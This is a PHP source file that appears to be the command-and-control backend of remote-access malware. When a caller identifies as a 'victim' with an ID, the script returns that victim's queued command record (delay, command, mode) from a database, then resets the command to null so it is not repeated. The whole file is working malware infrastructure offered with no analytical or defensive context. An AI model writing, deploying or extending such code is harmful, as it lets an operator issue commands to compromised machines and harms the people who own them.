<?php
	include("conf.php");
	if(isset($_GET["identity"]) && isset($_GET["uID"])) {
		if($_GET["identity"]=="victim") {
			$uid=$_GET["uID"];
			$conn=new mysqli($server, $username, $password, $db);
			if(!$conn->connect_errno) {
				if($query=$conn->prepare("SELECT Operand FROM $table WHERE `Key`=?")) {
					$query->bind_param("s", $uid);
					$query->execute();
					$query->bind_result($Operand);
                                        $query->fetch();
					print $Operand;
				}
                                $conn->close();
                                $conn=new mysqli($server, $username, $password, $db);
				if($query=$conn->prepare("UPDATE $table SET Operand=? WHERE `Key`=?")) {
                                        $tpk=json_decode($Operand);
					$default_data=[
						"delay"=>$tpk->delay,
						"command"=>"null",
						"mode"=>0
					];
					$default_opr=json_encode($default_data);
					$query->bind_param("ss", $default_opr, $uid);
					$query->execute();
                                        $conn->close();
				}
			}
		}
	}
	else
		print("Insufficient parameters");
?>